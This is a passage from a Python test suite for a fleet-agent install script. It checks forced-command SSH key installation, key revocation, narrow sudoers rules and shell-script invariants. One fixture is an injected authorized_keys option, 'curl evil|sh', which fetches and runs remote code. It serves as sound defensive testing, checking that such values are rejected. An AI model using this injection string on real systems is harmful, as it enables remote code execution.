    def run_script(self):
        return subprocess.run(["bash", str(self.script)], env=self.env, capture_output=True, text=True,
                              timeout=60, stdin=subprocess.DEVNULL)

    def ak(self):
        p = self.home / ".ssh/authorized_keys"
        return p.read_text() if p.exists() else ""

    def test_script_never_fails_apply(self):
        proc = self.run_script()
        self.assertEqual(proc.returncode, 0, proc.stderr)

    def test_agent_installed_root_0755_at_fixed_path(self):
        self.run_script()
        log = (self.root / "sudo.log").read_text()
        self.assertIn("install -o root -g root -m 0755", log)
        self.assertIn("/usr/local/libexec/fleet-agent", log)
        self.assertIn("enable-linger", log)

    def test_keys_written_with_forced_command_and_idempotent(self):
        (self.root / "op-public-key-diabolo").write_text(self.KEY_A + "\n")
        (self.root / "op-public-key-penelope").write_text(self.KEY_B + "\n")
        self.run_script()
        lines = self.ak().splitlines()
        self.assertEqual(len(lines), 2)
        for line, master in zip(lines, ("diabolo", "penelope")):
            self.assertTrue(line.startswith('restrict,command="/usr/local/libexec/fleet-agent" ssh-ed25519 '), line)
            self.assertTrue(line.endswith(f" fleet-master-{master}"), line)
        self.assertNotIn("masterA@host", self.ak(), "original comment is replaced")
        before = self.ak()
        mtime = (self.home / ".ssh/authorized_keys").stat().st_mtime_ns
        self.run_script()
        self.assertEqual(self.ak(), before)
        self.assertEqual((self.home / ".ssh/authorized_keys").stat().st_mtime_ns, mtime, "no rewrite when unchanged")
        self.assertEqual(oct((self.home / ".ssh/authorized_keys").stat().st_mode & 0o777), "0o600")

    def test_existing_user_keys_are_preserved_and_stale_master_revoked(self):
        ssh = self.home / ".ssh"
        ssh.mkdir()
        (ssh / "authorized_keys").write_text(
            "ssh-ed25519 AAAAUSER user@laptop\n"
            'restrict,command="/usr/local/libexec/fleet-agent" ssh-ed25519 AAAAOLD fleet-master-retired\n'
        )
        (self.root / "op-public-key-diabolo").write_text(self.KEY_A + "\n")
        self.run_script()
        text = self.ak()
        self.assertIn("ssh-ed25519 AAAAUSER user@laptop", text)
        self.assertNotIn("fleet-master-retired", text)
        self.assertIn("fleet-master-diabolo", text)

    def test_unreadable_key_keeps_the_existing_line(self):
        ssh = self.home / ".ssh"
        ssh.mkdir()
        old = 'restrict,command="/usr/local/libexec/fleet-agent" ssh-ed25519 AAAAKEEP fleet-master-penelope'
        (ssh / "authorized_keys").write_text(old + "\n")
        (self.root / "op-public-key-diabolo").write_text(self.KEY_A + "\n")
        proc = self.run_script()
        self.assertIn(old, self.ak())
        self.assertIn("penelope", proc.stderr)

    def test_option_injection_through_1password_value_is_rejected(self):
        (self.root / "op-public-key-diabolo").write_text('command="curl evil|sh" ssh-ed25519 AAAAx\n')
        (self.root / "op-public-key-penelope").write_text('ssh-rsa AAAAB3NzaC1yc2E x\n')
        self.run_script()
        self.assertEqual(self.ak(), "")


class StaticContracts(unittest.TestCase):
    """Source-level invariants (INVARIANTS.md) that no behaviour test would notice."""

    def test_verbs_list_is_exact_and_ping_is_not_a_case(self):
        text = AGENT.read_text()
        for verb in VERBS:
            self.assertIn(verb, text)
        self.assertNotRegex(text, re.compile(r"^\s*'?ping'?\)", re.I | re.M))
        cases = re.findall(r"^\s*((?:check|update|reboot-status|reboot|report)(?:\|[a-z-]+)*)\)", text, re.M)
        allowed = [c for c in cases if "|" in c][0].split("|")
        self.assertEqual(sorted(allowed), sorted(VERBS))

    def test_agent_has_no_free_form_eval_of_the_ssh_command(self):
        text = AGENT.read_text()
        self.assertNotRegex(text, r"eval\s+[\"']?\$\{?SSH_ORIGINAL_COMMAND")
        self.assertNotRegex(text, r"(bash|sh)\s+-c\s+[\"']?\$\{?SSH_ORIGINAL_COMMAND")

    def test_bash32_pitfalls_absent(self):
        for path in (AGENT, SYSUP):
            text = "\n".join(
                line for line in path.read_text().splitlines() if not line.lstrip().startswith("#")
            )
            self.assertNotIn("declare -A", text, path)
            self.assertNotIn("mapfile", text, path)
            self.assertNotIn("readarray", text, path)
            self.assertIsNone(re.search(r"\$\{[A-Za-z_]+(,,|\^\^)\}", text), path)

    def test_sudoers_adds_only_the_exact_reboot_command(self):
        text = SUDOERS_TMPL.read_text()
        reboot_rules = re.findall(r"NOPASSWD: (/\S*systemctl\S*.*)", text)
        self.assertEqual(reboot_rules, ["/usr/bin/systemctl reboot"])
        rules = re.findall(r"NOPASSWD: (.*)", text)
        for rule in rules:
            self.assertNotRegex(rule, r"[*?]|ALL\b", rule)
            self.assertNotIn("systemd-run", rule)
        self.assertNotRegex(text, r"NOPASSWD:\s*ALL")

    def test_sysup_is_non_interactive_and_matches_sudoers(self):
        # Static on purpose: running sysup for real would update this machine.
        sysup = SYSUP.read_text()
        self.assertIn("export DEBIAN_FRONTEND=noninteractive", sysup)
        self.assertIn("export NEEDRESTART_MODE=l", sysup)
        apt = "apt-get dist-upgrade -y -o Dpkg::Options::=--force-confdef -o Dpkg::Options::=--force-confold"
        self.assertIn(apt, sysup)
        sudoers = SUDOERS_TMPL.read_text().replace("\\", "")
        self.assertIn("/usr/bin/" + apt, sudoers, "sudoers must allow exactly the command sysup runs")
        self.assertIn('env_keep += "DEBIAN_FRONTEND NEEDRESTART_MODE"', sudoers)

    def test_agent_never_passes_reboot_to_sysup(self):
        agent = "\n".join(
            ln for ln in AGENT.read_text().splitlines() if not ln.lstrip().startswith("#")
        )
        self.assertNotIn("--reboot", agent)

    def test_shell_functions_only_call_the_script(self):
        aliases = (ROOT / "dot_shell_common/aliases.sh").read_text()
        self.assertIn('command sysup "$@"', aliases)
        fish = (ROOT / "dot_config/private_fish/config.fish.tmpl").read_text()
        self.assertIn("command sysup $argv", fish)
        nu = (ROOT / "dot_config/nushell/config.nu").read_text()
        self.assertIn("^sysup ...$rest", nu)
        for text in (aliases, fish, nu):
            self.assertNotIn("apt-get dist-upgrade", text)
            self.assertNotIn("dnf upgrade", text)

    def test_install_template_forces_the_agent_command(self):
        if not INSTALL_TMPL.exists():
            self.skipTest("install template not present")
        text = INSTALL_TMPL.read_text()
        self.assertIn('restrict,command="/usr/local/libexec/fleet-agent"', text)
        self.assertIn("install -o root -g root -m 0755", text)


if __name__ == "__main__":
    unittest.main()
